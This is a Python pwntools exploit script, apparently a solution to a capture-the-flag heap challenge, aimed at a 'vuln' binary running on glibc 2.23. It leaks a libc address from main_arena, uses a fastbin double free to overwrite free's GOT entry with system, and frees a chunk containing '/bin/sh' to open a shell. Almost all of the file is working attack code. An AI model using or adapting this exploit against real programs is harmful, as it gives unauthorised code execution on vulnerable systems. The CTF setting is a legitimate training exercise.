from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = gdb.debug('./vuln', 'set debug-file-directory debug/')
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,30709)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r)
    pause()
    pass

libc = ELF('./libc-2.23.so')
elf = ELF('./vuln')

def add(page,size,content):
    r.sendlineafter(b'Exit',b'1')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendafter(b'Content: ',content)

def delete(page):
    r.sendlineafter(b'Exit',b'2')
    r.sendlineafter(b'Index:', str(page).encode())

def show(page):
    r.sendlineafter(b'Exit',b'3')
    r.sendlineafter(b'Index:', str(page).encode())

add(0,0x80,b'A'*0x80)
add(1,0x80,b'A'*0x80)
add(2,0x50,b'A'* 0x50)
add(3,0x50,b'A'* 0x50)
add(4,0x10,b'/bin/sh\x00')
delete(0)
show(0)

main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) 
libc_addr = main_arena_addr - 0x3c4b78
libc.address = libc_addr
system_addr = libc.sym['system']
free_addr = elf.got['free']

delete(2)
delete(3)
delete(2)

print(f'main_arena_addr = {hex(main_arena_addr)}')
print(f'libc_addr = {hex(libc_addr)}')
print(f'system_addr = {hex(system_addr)}')
print(f'free_addr-8 = {hex(free_addr)}')


add(5,0x50,p64(0x602002-8)) #向fastbin next写入free_got

add(6,0x50,b'A'* 0x50)
add(7,0x50,b'A'* 0x50)
pause()
add(8,0x50,b'\x00'*14+p64(system_addr)) #申请的fastbin指向free_got
pause()
delete(4)
#free且传参/bin/sh
r.interactive()
